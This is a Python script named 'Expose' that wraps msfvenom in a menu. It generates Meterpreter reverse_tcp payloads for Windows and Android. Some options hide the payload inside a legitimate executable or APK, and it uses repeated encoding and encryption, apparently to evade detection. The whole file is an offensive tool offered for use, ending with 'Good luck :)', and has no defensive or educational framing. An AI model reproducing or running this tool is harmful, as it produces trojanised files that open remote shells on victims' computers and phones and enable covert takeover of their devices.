import os
import subprocess
from colorama import Fore, Style, init
from pyfiglet import figlet_format
import sys

init(autoreset=True)

def execute_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        return result.returncode, result.stdout, result.stderr
    except Exception as e:
        return 1, "", str(e)



def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{Fore.GREEN}{Style.BRIGHT}{figlet_format('  Expose')}")
    print(f"{Fore.GREEN}{Style.BRIGHT}                                    Created by Syntax")

    print()
    print()
    print(f"{Fore.GREEN}{Style.BRIGHT}      [1] x64 Windows payload (exe)")
    print(f"{Fore.GREEN}{Style.BRIGHT}      [2] x86 Windows payload (exe)")
    print(f"{Fore.GREEN}{Style.BRIGHT}      [3] x64 Windows payload (embed exe)")
    print(f"{Fore.GREEN}{Style.BRIGHT}      [4] X86 Windows payload (embed exe)")
    print(f"{Fore.GREEN}{Style.BRIGHT}      [5] Android payload (apk)")
    print(f"{Fore.GREEN}{Style.BRIGHT}      [6] Android payload (embed apk)")
    print(f"{Fore.GREEN}{Style.BRIGHT}\n                          [99] Exit")
    print()

    selection = input(f"{Fore.GREEN}{Style.BRIGHT} [*] selection: ")

    if selection == "1":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "cmd/powershell_base64", "-i", "30", "--encrypt", "base64", "--arch", "x64", "--platform", "windows", "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")

    elif selection == "2":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "x86/shikata_ga_nai", "-i", "30", "--encrypt", "rc4", "--arch", "x86", "--platform", "windows", "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")

    elif selection == "3":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "cmd/powershell_base64", "-i", "30", "--encrypt", "base64", "--arch", "x64", "--platform", "windows", "-x", embedfile, "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload was successfully buried!")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")

    elif selection == "4":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "x86/shikata_ga_nai", "-i", "30", "--encrypt", "rc4", "--arch", "x86", "--platform", "windows", "-x", embedfile, "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload was successfully buried!")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")

    elif selection == "5":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "--platform", "android", "--arch", "dalvik", "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")

    elif selection == "6":
        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
        if localip and localport and filename:
            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "--platform", "android", "--arch", "dalvik", "-x", embedfile, "-o", filename])
            if payload_code == 0:
                full_path = os.path.abspath(filename)
                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload was successfully buried!")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload Created Successfully! Good luck :)")
                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
            else:
                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}{Style.BRIGHT}\n[!] ctrl-c detected! exiting..")
        sys.exit()
